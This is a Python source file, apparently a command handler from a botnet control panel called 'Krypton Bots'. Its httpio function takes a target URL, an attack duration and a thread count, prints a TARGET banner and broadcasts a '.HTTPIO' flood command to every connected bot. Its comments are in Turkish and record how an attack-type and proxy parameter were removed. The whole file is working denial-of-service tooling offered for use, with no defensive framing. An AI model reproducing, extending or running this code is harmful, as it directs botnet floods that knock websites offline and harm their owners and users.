import time
from colorama import Fore

def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    
    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    # Argüman sayısı artık 4 olmalı: .httpio <url> <süre> <threads>
    if len(args) == 4:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        
        # 'attackType' artık yok, bu yüzden bilgilendirme ekranından kaldırıldı.
        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sTIME:%s %s
         %sTHREADS:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, threadx, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP IO')

        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                # 'attackType' kontrolü tamamen kaldırıldı. Komut her zaman geçerlidir.
                for x in xxxx.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
                send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                
                # Bot'a gönderilecek komut yeniden oluşturuluyor. Artık proxy tipi içermiyor.
                # Orijinal 'data' argümanını kullanmıyoruz çünkü içinde geçersiz parametre var.
                clean_command = f".HTTPIO {url} {secs} {threadx}"
                broadcast(clean_command)
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        # Kullanım talimatı güncellendi.
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpio [URL] [TIME] [THREADS]\n')